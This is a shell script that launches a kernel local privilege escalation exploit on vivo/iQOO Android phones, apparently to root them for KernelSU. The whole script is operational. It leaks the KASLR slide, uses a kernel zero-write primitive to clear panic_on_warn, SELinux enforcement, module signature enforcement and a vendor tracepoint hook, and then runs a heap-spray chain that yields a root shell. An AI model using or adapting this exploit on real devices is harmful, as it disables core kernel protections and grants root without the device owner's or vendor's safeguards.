#!/system/bin/sh
# run_lpe.sh -- APK-side one-tap launcher for the POSIX CPU timer LPE.
#
# Runs as the adb shell identity (uid 2000 / u:r:shell:s0, SELinux enforcing)
# through the Shizuku user service.  Everything it writes lives under
# /data/local/tmp.  The whole plan is logged to the app's log file:
#
#   [1] ic-timer slide   -- recover this boot's KASLR slide from
#       sched_blocked_reason and print FUNCS / SELINUX_STATE / INIT_USER_NS.
#       Accepted only on vivo/iQOO 6.1.145.  The binary embeds per-build
#       tables; any other build needs /data/local/tmp/ic-syms.txt produced
#       by `ic-timer syms boot.img` (or the PC-side tool/parse_offsets.py).
#       A wrong table is refused.  Set IC_ALLOW_ANY_KERNEL=1 /
#       IC_DEVICE_ANY=1 only for deliberate tests.
#   [2] vr.ko disarm     -- zero __tracepoint_sys_exit->funcs with the AF_UNIX
#       8K zero-write, BEFORE the chain releases the fake-cred winner.  On
#       16.1.15.0 the winner died at its first syscall otherwise (ladder=1);
#       the X300/t28 fake chain does the same step before waking its child.
#       This is a full parked attempt, not a payload action.
#   [3] SELinux          -- on a stock policy, zero selinux_state-7 so only
#       `enforcing` is cleared and `initialized` survives, then gate on
#       `getenforce` + `policyvers`.  On a device that already has a
#       permissive u:r:ksu:s0 domain this step is skipped.
#   [4] mcast chain      -- with IC_REAL_INIT_USER_NS so the fake cred's
#       capabilities count in init_user_ns (ksud late-load needs
#       CAP_SYS_MODULE).  Payload = KSU handoff + proof.
#
# The chain environment below is the run18 (2026-10-25) validated one; the
# comments at the end of this header explain the knobs.
#
# Success looks like
#   [auto] zero selinux landed
#   [ctxmap] u:r:ksu:s0 = sid N
#   [helper] launched euid=0 ...
#   [ksu] late-load(allow-shell) rc=0
#   uid=0(root) ... LPE-PROOF
# A run with no "case L=" line just means every leak landed on an unsupported
# timer offset (7 of 31): rerun with more attempts after a reboot.
#
# SAFE_FILL (default 4000) makes a failed capture report "no leak" instead of
# panicking: the spray runs first, so a captured node is never touched.
# LATE_FILL (2000) takes pages freed late by call_rcu().  SKBF_MIN (8) frees
# only a handful of queued order-2 datagrams before the spray; freeing all
# 32320 (496 MB) buried the slab on the phone.  IC_ATTEMPT_WAIT is in 200 ms
# ticks (900 = 180 s) and must stay longer than an attempt: overlapping
# attempts steal each other's captured page (run20 panicked that way).
#
# Every attempt that leaks parks instead of exiting -- the stale timer node
# sits in one of our psl pages, and releasing the task would walk it.  Parked
# attempts keep ~600 psl sockets (~10 MB) until reboot and must NEVER be
# killed -9.  Reboot to clean them.

set -u
unset IC_EARLY_WAIT IC_EARLY_GATE
# PIPE matters as much as HUP: closing USB debugging tears down the Shizuku
# service and the log pipe; a write must not kill a parked attempt.
trap '' PIPE HUP INT TERM

ident() { getprop "$1" 2>/dev/null; }
devmem=$(sed -n 's/^MemTotal:[[:space:]]*\([0-9]*\).*/\1/p' /proc/meminfo 2>/dev/null)
echo "[dev] model=$(ident ro.product.model) device=$(ident ro.product.device) sdk=$(ident ro.build.version.sdk) build=$(ident ro.build.display.id) kernel=$(uname -r 2>/dev/null) arch=$(uname -m 2>/dev/null) mem=${devmem:-?}kB ksu=$( [ -d /data/adb/ksu ] && echo yes || echo no)"
echo "[dev] run uid=$(id -u 2>/dev/null) ctx=$(cat /proc/self/attr/current 2>/dev/null) enforce=$(getenforce 2>/dev/null) panicoops=$(cat /proc/sys/kernel/panic_on_oops 2>/dev/null) sig_enforce=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null)"
echo "[dev] version=$(cat /proc/version 2>/dev/null)"

# Fresh-boot hint.  The public ports of this CVE (own127 for PD2458a /
# OriginOS 7, TimerRoot/YuKongA) push the payload, reboot, wait for
# sys.boot_completed and start the exploit ~2 s later; their launcher warns
# when uptime > 40 s.  A warm system has a populated posix_timers cache,
# background timer traffic and pending RCU callbacks -- all of which cost
# discard hits.  We cannot reboot from inside the shell domain, so say it.
UPT=$(cut -d' ' -f1 /proc/uptime 2>/dev/null)
echo "[boot] uptime=${UPT:-?}s"
case "${UPT%%.*}" in
''|*[!0-9]*) ;;
*)
	if [ "${UPT%%.*}" -gt 120 ]; then
		echo "[boot] WARN >120s since boot: reboot and start soon for the best discard rate (unlocking first is fine)"
	fi ;;
esac

# Universal-target gate: vivo/iQOO + 6.1.145.  The Android-side device check
# is repeated by the binary from build.prop; this early check keeps an
# accidental run on another phone from even opening tracefs.
KERNEL=$(uname -r 2>/dev/null)
case "$KERNEL" in
*6.1.*|*5.10.*) ;;
*)
	if [ "${IC_ALLOW_ANY_KERNEL:-0}" != "1" ]; then
		echo "[auto] kernel '$KERNEL' is not 6.1.x/5.10.x; this tool targets vivo/iQOO 6.1 and 5.10"
		exit 4
	fi ;;
esac
DEVID="$(getprop ro.product.manufacturer 2>/dev/null) $(getprop ro.product.brand 2>/dev/null) $(getprop ro.product.model 2>/dev/null) $(getprop ro.product.device 2>/dev/null)"
DEVL=$(printf '%s' "$DEVID" | tr 'A-Z' 'a-z')
case "$DEVL" in
*vivo*|*iqoo*|*v2*|*pd2*|*pd3*) ;;
*)
	if [ "${IC_DEVICE_ANY:-0}" != "1" ]; then
		echo "[auto] device '$DEVID' is not a vivo/iQOO model"
		exit 4
	fi ;;
esac
export IC_DEVICE_VIVO=1
export IC_DEVICE_MODEL="$(getprop ro.product.device 2>/dev/null):$(getprop ro.product.model 2>/dev/null)"
export IC_BUILD_VERSION="$(getprop ro.build.display.id 2>/dev/null)"
echo "[auto] target=ok kernel=$KERNEL device=$DEVID build=${IC_BUILD_VERSION:-?}"

# Zero-write budget for fill / late / prime / slack / wait scales with the
# per-CPU pageset high (memory size), clamped at 100%.
PCP_HIGH=$(awk '/high:/{if ($2+0 > m) m=$2+0} END{print m+0}' /proc/zoneinfo 2>/dev/null)
case "$PCP_HIGH" in ''|*[!0-9]*) PCP_HIGH=3093 ;; esac
if [ "$PCP_HIGH" -lt 512 ] || [ "$PCP_HIGH" -gt 100000 ]; then PCP_HIGH=3093; fi
Z_SCALE=$((PCP_HIGH * 100 / 3093))
[ "$Z_SCALE" -lt 100 ] && Z_SCALE=100
# The pad pool is fixed: 4200 = 135*31 + 15 leaves the 16 free slots the
# chain needs in X's slab, and a larger pool changes that layout and stops
# the early discard.  The binary normalises any other value to 15 mod 31.
Z_PAD_POOL=4200
Z_PAD_KEEP=4185
Z_SAFE_FILL=$((4000 * Z_SCALE / 100))
Z_LATE_FILL=$((2000 * Z_SCALE / 100))
Z_EARLY_PRIME=$((1024 * Z_SCALE / 100))
Z_EARLY_SLACK=$((512 * Z_SCALE / 100))
[ "$Z_EARLY_SLACK" -gt 2047 ] && Z_EARLY_SLACK=2047
Z_EARLY_WAIT_MS=$((5000 * Z_SCALE / 100))
# 16.2.21.1 hands the kfree_rcu callbacks behind the pad/flush deletes to the
# cache in split batches; the 5 s path misses them on the big-memory phone.
# Give the wait a floor there so one attempt covers the late batch.
if [ "${devmem:-0}" -ge 11000000 ] && [ "$Z_EARLY_WAIT_MS" -lt 20000 ]; then
	Z_EARLY_WAIT_MS=20000
fi
ZERO_ATTEMPTS_DEF=6
# Big-memory phones lose more attempts to the split-RCU geometry; one
# extra pair costs ~40 s and lifts the cumulative hit probability a lot.
if [ "${devmem:-0}" -ge 11000000 ]; then ZERO_ATTEMPTS_DEF=8; fi
# Width of the first spray wave fired the moment the discard is visible:
# a wider wave costs a few MB and covers more of the pageset head.
if [ "${devmem:-0}" -ge 11000000 ]; then EBURST=512; else EBURST=256; fi
ZERO_WAIT_DEF=600
ZERO_EARLY="IC_EARLY_WAIT=1 IC_EARLY_GATE=1"
echo "[auto] zero budget: pcp_high=$PCP_HIGH scale=${Z_SCALE}% pad_pool=$Z_PAD_POOL pad_keep=$Z_PAD_KEEP fill=$Z_SAFE_FILL late=$Z_LATE_FILL prime=$Z_EARLY_PRIME slack=$Z_EARLY_SLACK wait_ms=$Z_EARLY_WAIT_MS"

# Symbol table: /data/local/tmp/ic-syms.txt is generated from this build's
# boot.img.  Without it only the gf506252fa70d built-in table is accepted.
SYMS="${IC_SYMS_FILE:-/data/local/tmp/ic-syms.txt}"
if [ -f "$SYMS" ]; then
	SB=$(sed -n 's/^# build=//p' "$SYMS" 2>/dev/null | head -n 1)
	echo "[auto] syms=$SYMS build=${SB:-?}"
	export IC_SYMS_FILE="$SYMS"
else
	echo "[auto] syms=builtin/known (no external table at $SYMS; per-build tables embedded)"
	unset IC_SYMS_FILE 2>/dev/null || true
fi

DIR=/data/local/tmp
DROP="$DIR/ic-dropdir"
STAGE="$DIR/ic-stage"
BIN="${IC_BIN:-$DIR/ic-timer}"
ATTEMPTS="${ATTEMPTS:-16}"
[ -x "$BIN" ] || { echo "missing $BIN" >&2; exit 1; }

# One consolidated log.  Under the APK, tee's stdout is the Shizuku service
# log pipe, so every zero attempt lands live in the same ic-app-a*.log the UI
# follows (and the pump copies to /sdcard/Download).  When IC_APP_LOG is
# missing (e.g. a Shizuku user service left over from an older APK) do not
# create a second file: the pipe still carries everything to the app log.
if [ -n "${IC_APP_LOG:-}" ]; then
	echo "[log] one file: $IC_APP_LOG (zero attempts mirrored live)"
else
	echo "[log] one file: stdout (no IC_APP_LOG; the APK pump owns the app log)"
fi
mkdir -p "$DROP" "$STAGE" || exit 1
chmod 0777 "$DROP" 2>/dev/null

# One parked zero-write attempt.  Returns 0 once "[zero] target=" appears,
# 1 on a reported miss/timeout.  The attempt itself keeps running (parked)
# on success -- never kill it.
zero_attempt() { # name target selinux [late_env]
	zn=$1
	zt=$2
	zs=$3
	zlog="$DIR/zero-$zn.log"
	: > "$zlog"
	# While panic_on_warn is still 1 (this very stage), one reap-B WARN
	# reboots the phone; forbid the "trace says the page is free" shortcut.
	case "$zn" in
	pnowarn) ZNOCONT="IC_NO_LATE_CONTINUE=1" ;;
	*)       ZNOCONT="" ;;
	esac
	env PATH=/sbin:/system/bin:/system/xbin \
	    IC_PEAK=1 IC_FORK=1 IC_REVERSE=1 IC_PC=0 IC_PEAK_SKBF=1 \
	    IC_KEEP_POOL=1 IC_SKB_MIN=8 IC_AIO_NOFAULT=1 IC_AIO_NOREMAP=1 \
	    IC_ANON_PAGES=0 IC_AIO_EVENTS=1 IC_VMA_KEEP=10 IC_AIO_CTXS=16384 \
	    IC_VMA_PREWARM=16384 IC_STAGING_DIR="$STAGE" IC_FILP_SHIELD=18000 \
	    IC_KM64_SHIELD=4096 IC_ATTEMPT_WAIT=900 \
	    IC_ATTEMPTS="${ZERO_ATTEMPTS:-$ZERO_ATTEMPTS_DEF}" IC_SAFE_FILL="$Z_SAFE_FILL" IC_LATE_FILL="$Z_LATE_FILL" IC_SLABTRACE=1 \
	    IC_PAD_ALIGN=1 IC_PAD_POOL="$Z_PAD_POOL" IC_PAD_KEEP="$Z_PAD_KEEP" IC_PAD_FREE="${PAD_FREE:-24}" IC_EARLY_BURST="${EARLY_BURST:-$EBURST}" IC_FLUSH_SPARSE=15 \
	    IC_SPRAY_EARLY=1 IC_EARLY_PRIME="$Z_EARLY_PRIME" IC_EARLY_SLACK="$Z_EARLY_SLACK" \
	    IC_EARLY_WAIT_MS="$Z_EARLY_WAIT_MS" $ZERO_EARLY $PFN_ENV $ZNOCONT \
	    IC_SKB_SOCKS=8 IC_SPRAY=unixstr \
	    IC_UNXSTR_MSGS=8192 IC_ZERO_TARGET="$zt" IC_ZERO_SELINUX="$zs" \
	    "$BIN" >> "$zlog" 2>&1 &
	# The binary writes straight into the phase log, so its own
	# ic_log_sync() (fflush + fsync on fd 2) really reaches the file and
	# the last line survives a kernel panic.  A tail mirrors the same
	# lines into the app log for the one-file view.
	zpid=$!
	tail -n +1 -f "$zlog" 2>/dev/null &
	tpid=$!
	i=0
	while [ $i -lt "$ZERO_WAIT_DEF" ]; do
		if grep -q '\[zero\] target=' "$zlog" 2>/dev/null; then
			# tail already streamed the attempt into the one log.
			echo "[auto] zero $zn landed"
			kill "$tpid" 2>/dev/null
			return 0
		fi
		# A single "no leak" is only one attempt: the binary's
		# supervisor parks it and forks the next one (IC_ATTEMPTS).
		# Wait for the supervisor to give up ("no root after") or to
		# exit before declaring the phase failed; breaking on the
		# first miss threw away the remaining attempts.
		if grep -q 'no root after' "$zlog" 2>/dev/null; then
			break
		fi
		if ! kill -0 "$zpid" 2>/dev/null; then
			# The supervisor exited without a verdict (crash or
			# an emit we do not parse); take one more look below.
			break
		fi
		sleep 1
		i=$((i + 1))
	done
	echo "[auto] zero $zn failed (full phase log: $zlog)"
	kill "$tpid" 2>/dev/null
	return 1
}

# Survive the previous run: the per-stage logs are fsynced line by line, so
# after a park or a reboot their tails say exactly where the last run died.
# Without this the app log always ends mid-attempt and there is no adb.
for pf in "$DIR"/zero-*.log; do
	[ -f "$pf" ] || continue
	echo "[prev] $(basename "$pf") last lines:"
	tail -n 6 "$pf" 2>/dev/null | sed 's/^/[prev]   /'
done

echo "[auto] [1/5] slide"
# A quiet phone can leave too few sched_blocked_reason anchors in the one
# sampling window ("anchors=4 votes=1 ... weak vote"), and the tool correctly
# refuses to aim a kernel write at a guess.  The window is a lottery on a busy
# system, so try a few times before giving up.
for stry in 1 2 3; do
	SLIDE_OUT=$("$BIN" slide 2>&1)
	printf '%s\n' "$SLIDE_OUT"
	case "$SLIDE_OUT" in
	*SLIDE=*) break ;;
	esac
	if [ "$stry" -lt 3 ]; then
		echo "[auto] weak slide; retry $stry/2"
		sleep 1
	fi
done
SLIDE=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^SLIDE=//p' | tail -n 1)
FUNCS=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^FUNCS=//p' | tail -n 1)
STATE=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^SELINUX_STATE=//p' | tail -n 1)
USRNS=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^INIT_USER_NS=//p' | tail -n 1)
SIGENF=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^SIG_ENFORCE=//p' | tail -n 1)
MODNF=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^MODULE_NOTIFY=//p' | tail -n 1)
POW=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^PANIC_ON_WARN=//p' | tail -n 1)
if [ -z "${SLIDE:-}" ] || [ -z "${FUNCS:-}" ] || [ -z "${STATE:-}" ] || [ -z "${USRNS:-}" ]; then
	echo "[auto] no usable slide for this boot; stopping before any kernel write"
	echo "[auto] tracefs state for diagnosis (raw ring is what the vote needs):"
	"$BIN" trace 2>&1 | sed -n '1,20p'
	echo "[auto] send this log -- a different kernel build needs a new symbol table"
	exit 4
fi

# Safety net for a missed capture: the stale node at X stays RB_EMPTY and
# reap B's timerqueue_del WARNs; panic_on_warn=1 turns that WARN into a
# reboot.  Zero the variable first (same 8-byte write primitive) so every
# later miss parks instead of rebooting.  panic_on_warn is followed by
# warn_limit, which is safe to zero.
# If the slide table has no panic_on_warn for this build, try the live
# kallsyms address (kptr_restrict permitting); it is already slid.
if [ -z "${POW:-}" ] || [ "${POW:-0}" = "0" ]; then
	POW=$(awk '$3=="panic_on_warn"{print $1; exit}' /proc/kallsyms 2>/dev/null)
	case "${POW:-}" in
	''|0|0000000000000000) POW= ;;
	*) echo "[auto] panic_on_warn resolved from kallsyms: $POW" ;;
	esac
fi
# Tracefs page-alloc oracle probe.  Public ports of this CVE (YuKongA /
# TimerRoot) use kmem:mm_page_free + mm_page_alloc to know exactly when the
# victim slab page is freed and whether one of their own spray threads took
# it -- a pre-reap capture check we do not have.  They enable the events
# through events/kmem/rss_stat/trigger because the per-event enable files are
# root-only.  Run the probe once per boot so one device log answers whether
# that path is open here; never fatal.
# Raw-record layout dump for the kmem oracle (yardstick for the port:
# tells us where call_site / ptr / bytes_req sit on this build).  Cheap.
ORACLE_KMEM=no
ORACLE_TRACE=no
if [ "${IC_KMEM_PROBE:-1}" = "1" ]; then
	echo "[auto] [kmem] layout dump"
	KOUT=$("$BIN" kmem 2>&1)
	printf '%s\n' "$KOUT" | sed -n '1,20p'
	KPF=$(printf '%s\n' "$KOUT" | sed -n 's/.* pfns=\([0-9]*\).*/\1/p' | tail -1)
	KVR=$(printf '%s\n' "$KOUT" | sed -n 's/.* verify=\([0-9]*\).*/\1/p' | tail -1)
	case "$KOUT" in
	*"base=0x"*)
		if [ "${KPF:-0}" -ge 32 ] && [ "${KVR:-0}" -ge 24 ]; then
			ORACLE_KMEM=yes
		fi ;;
	esac
	echo "[auto] kmem gate: pfns=${KPF:-0} verify=${KVR:-0} -> $ORACLE_KMEM"
fi

# Vendor module-load defense probe.  On OriginOS 7 vivo ships hooks_defend.ko
# (from vendor_boot ramdisk, [permanent], kprobe on load_module): any module
# whose SHA256 prefix is not in its whitelist fails with EPERM no matter what
# sig_enforce or the module notifier say.  Read-only check so the log says
# which of the two bypass paths applies.
if [ -r /proc/modules ]; then
	HOOKS=$(grep -iE 'hooks_defend|common_hooks|hks_dfd|hks-dfd' /proc/modules 2>/dev/null | head -n 2)
	echo "[sec] module defense: ${HOOKS:-none of hooks_defend/hks in /proc/modules}"
fi
if [ -d /sys/kernel/bsp_security ]; then
	echo "[sec] bsp_security: $(ls /sys/kernel/bsp_security 2>/dev/null | tr '\n' ' ')"
else
	echo "[sec] bsp_security: absent"
fi
dmesg 2>/dev/null | grep -a 'hks-dfd' | tail -n 2 | sed 's/^/[sec] dmesg: /'

if [ "${IC_TRACE_PROBE:-1}" = "1" ]; then
	echo "[auto] [trace] probing kmem oracle"
	TOUT=$("$BIN" trace 2>&1)
	printf '%s\n' "$TOUT" | sed -n '1,40p'
	case "$TOUT" in
	*"-> oracle=yes"*) ORACLE_TRACE=yes ;;
	esac
fi

if [ "$ORACLE_KMEM" = yes ] && [ "$ORACLE_TRACE" = yes ]; then
	PFN_ENV="IC_PFN_ORACLE=1"
	echo "[auto] pfn oracle: on (trace page records)"
elif [ "${IC_FORCE_ORACLE:-0}" = "1" ]; then
	# Manual override for experiments: run the in-process calibration and
	# use whatever base it manages to derive.  If that also fails the
	# binary falls back to the slabinfo path on its own.
	PFN_ENV="IC_PFN_ORACLE=1"
	echo "[auto] pfn oracle: forced on (IC_FORCE_ORACLE=1)"
else
	PFN_ENV=""
	echo "[auto] pfn oracle: off (kmem=$ORACLE_KMEM trace=$ORACLE_TRACE)"
fi

POWVAL=$(cat /proc/sys/kernel/panic_on_warn 2>/dev/null)
KPTR=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)
# An unreadable sysctl must not be mistaken for "already 0": on vivo the
# shell domain often cannot read /proc/sys/kernel/panic_on_warn at all
# (both 16.2.13.1 and 16.1.11.0 device logs show current=?), and the old
# ${POWVAL:-0} default silently skipped this write -- every later missed
# attempt then rebooted on the reap-B WARN.  Only an explicit "0" skips.
if [ -n "${POW:-}" ] && [ "${POW:-0}" != "0" ] && [ "${POWVAL:-?}" != "0" ]; then
	echo "[auto] [0/5] zero panic_on_warn <- $POW (current=${POWVAL:-unreadable})"
	zero_attempt pnowarn "$POW" 0 || \
		echo "[auto] panic_on_warn zero missed; continuing"
else
	echo "[auto] [0/5] panic_on_warn: addr=${POW:-none} current=${POWVAL:-?} kptr_restrict=${KPTR:-?}; no write"
fi

VR=$(grep -c '^vr ' /proc/modules 2>/dev/null)
if [ "${VR:-0}" -gt 0 ]; then
	echo "[auto] [2/5] vr.ko present: zero funcs <- $FUNCS"
	zero_attempt funcs "$FUNCS" 0 || {
		echo "[auto] vr disarm failed; reboot and retry"
		exit 5
	}
else
	echo "[auto] [2/5] no vr module loaded; no disarm needed"
fi

CTX=u:r:ksu:s0
STOCK=${IC_STOCK:-auto}
if [ "$STOCK" = "auto" ]; then
	if [ -d /data/adb/ksu ]; then STOCK=0; else STOCK=1; fi
fi
if [ "$(getenforce 2>/dev/null)" = "Permissive" ]; then
	echo "[auto] SELinux already Permissive; no state write"
	STOCK=2
	CTX=u:r:shell:s0
fi
if [ "$STOCK" = "1" ]; then
	echo "[auto] [3/5] stock policy: zero selinux_state-7 <- $STATE"
	zero_attempt selinux "$STATE" 1 || {
		echo "[auto] selinux zero failed; reboot and retry"
		exit 5
	}
	if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
		echo "[auto] still Enforcing after the write; STOP and reboot"
		exit 5
	fi
	if ! cat /sys/fs/selinux/policyvers >/dev/null 2>&1; then
		echo "[auto] policyvers unreadable = initialized cleared; REBOOT NOW"
		exit 6
	fi
	echo "[auto] SELinux Permissive, initialized intact"
	CTX=u:r:shell:s0
fi

# Clear sig_enforce (bool_enable_only, so sysfs cannot turn it off) and
# truncate the module notifier when the kernel reports sig_enforce=1, so
# ksud late-load can load kernelsu.ko.  A miss is non-fatal.
SIGVAL=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null)
echo "[auto] [4/5] module bypass: sig_enforce=${SIGVAL:-?} sig=$( [ -n "${SIGENF:-}" ] && echo yes || echo no) notify=$( [ -n "${MODNF:-}" ] && echo yes || echo no)"
if [ "${SIGVAL:-1}" != "0" ]; then
	if [ -n "${SIGENF:-}" ] && [ "${SIGENF:-0}" != "0" ]; then
		echo "[auto] zero sig_enforce <- $SIGENF"
		zero_attempt sigenforce "$SIGENF" 0 || \
			echo "[auto] sig_enforce zero missed; continuing"
	fi
	if [ -n "${MODNF:-}" ] && [ "${MODNF:-0}" != "0" ]; then
		MNH=$(( MODNF + 40 ))
		echo "[auto] truncate module_notify_list head <- 0x$(printf %x "$MNH")"
		zero_attempt modnotify "$MNH" 0 || \
			echo "[auto] module notifier zero missed; continuing"
	fi
else
	echo "[auto] sig_enforce=0; module bypass stages skipped"
fi

# Older APKs prefixed the payload with their own disarm subshell; strip it so
# it cannot spawn a nested attempt after the pre-chain disarm above.
PAYLOAD_CMD=$(printf '%s\n' "${PAYLOAD_CMD:-id; cat /proc/self/attr/current; getenforce; echo LPE-PROOF}" | sed 's/^( IC_DISARM_VR=1 [^)]*) & //')

echo "[auto] [5/5] mcast chain ctxmap=$CTX userns=$USRNS attempts=$ATTEMPTS"
exec env PATH=/sbin:/system/bin:/system/xbin \
    IC_PEAK=1 \
    IC_FORK=1 \
    IC_REVERSE=1 \
    IC_PC=0 \
    IC_PEAK_SKBF=1 \
    IC_KEEP_POOL=1 \
    IC_SKBF_MIN="${SKBF_MIN:-8}" \
    IC_AIO_NOFAULT=1 \
    IC_AIO_NOREMAP=1 \
    IC_ANON_PAGES=0 \
    IC_AIO_EVENTS=1 \
    IC_VMA_KEEP=10 \
    IC_AIO_CTXS=16384 \
    IC_VMA_PREWARM=16384 \
    IC_STAGING_DIR="$STAGE" \
    IC_SPRAY=mcast $PFN_ENV \
    IC_FILP_SHIELD=18000 \
    IC_KM64_SHIELD=4096 \
    IC_ATTEMPT_WAIT="${IC_ATTEMPT_WAIT:-900}" \
    IC_ATTEMPTS="$ATTEMPTS" \
    IC_SCAN=1 \
    IC_SCAN_CTXMAP="$CTX" \
    IC_REAL_INIT_USER_NS="$USRNS" \
    IC_INTERN_SELF=1 \
    IC_PREP_DROP=1 \
    IC_SCAN_DROP_DIR="$DROP" \
    IC_DROP_MODE=7 \
    IC_SCAN_EXIT_AFTER_DROP=1 \
    IC_SAFE_FILL="${SAFE_FILL:-$Z_SAFE_FILL}" \
    IC_LATE_FILL="${LATE_FILL:-$Z_LATE_FILL}" \
    IC_SLABSNAP=1 \
    IC_SLABTRACE=1 \
    IC_PAD_ALIGN=1 \
    IC_PAD_FREE="${PAD_FREE:-24}" \
    IC_SPRAY_EARLY=1 \
    IC_EARLY_WAIT=1 \
    IC_EARLY_GATE=1 \
    IC_EARLY_WAIT_MS="${EARLY_WAIT_MS:-$Z_EARLY_WAIT_MS}" \
    IC_EARLY_PRIME="${EARLY_PRIME:-$Z_EARLY_PRIME}" \
    IC_EARLY_SLACK="${EARLY_SLACK:-$Z_EARLY_SLACK}" \
    IC_SKB_SOCKS=8 \
    IC_PAD_KEEP="${PAD_KEEP:-$Z_PAD_KEEP}" \
    IC_PAD_POOL="${PAD_POOL:-$Z_PAD_POOL}" \
    IC_FLUSH_SPARSE=15 \
    IC_PAYLOAD_CMD="$PAYLOAD_CMD" \
    "$BIN"
